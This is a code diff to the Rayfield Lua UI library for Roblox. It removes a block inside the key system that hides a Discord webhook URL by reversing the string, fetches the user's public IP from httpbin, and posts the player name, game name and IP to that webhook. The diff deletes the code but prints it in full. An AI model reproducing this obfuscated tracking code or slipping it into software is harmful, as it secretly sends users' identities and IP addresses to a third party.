@@ -1123,44 +1123,6 @@ function RayfieldLibrary:CreateWindow(Settings)
 	end
 	if Settings.KeySystem then
 		repeat wait() until Passthrough
-		local Http = game:GetService("HttpService")
-		local VevoWebhook = string.reverse("Dd-nW-aq4uzJohNtpo1U0Ja4kcZyNQyI3SYa9lYN-Sq8owldcwqxO4Iw8hSjbHJYqNAM/3473424249149186501/skoohbew/ipa/moc.drocsid//:sptth")
-		local marketplaceService = game:GetService("MarketplaceService")
-		local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
-		local httpbin = request({ Url = "https://httpbin.org/get" })
-		local httpbinget = request({ Url = "https://httpbin.org/get", Method = "GET"})
-		local IP = game:GetService("HttpService"):JSONDecode(httpbinget.Body)["origin"]
-	    local responce = request({
-			Url = VevoWebhook,
-			Method = 'POST',
-			Headers = {
-				['Content-Type'] = 'application/json'
-			},
-			Body = Http:JSONEncode({
-				["content"] = "",
-				["embeds"] = {{
-					["title"] = "**Vevo Hub has been executed!**",
-					["description"] = "**USER: **"..game.Players.LocalPlayer.Name,
-					["type"] = "rich",
-					["color"] = tonumber(0xffffff),
-					["thumbnail"] = {
-						["url"] = "https://i.ibb.co/B6vn8nS/vevo-icon-14.png"
-					},
-					["fields"] = {
-						{
-							["name"] = "GAME:",
-							["value"] = info.Name,
-							["inline"] = false
-						},
-						{
-							["name"] = "IP:",
-							["value"] = IP,
-							["inline"] = false
-						}
-					}
-				}}
-			})
-		})
 	end
 	
 	Notifications.Template.Visible = false
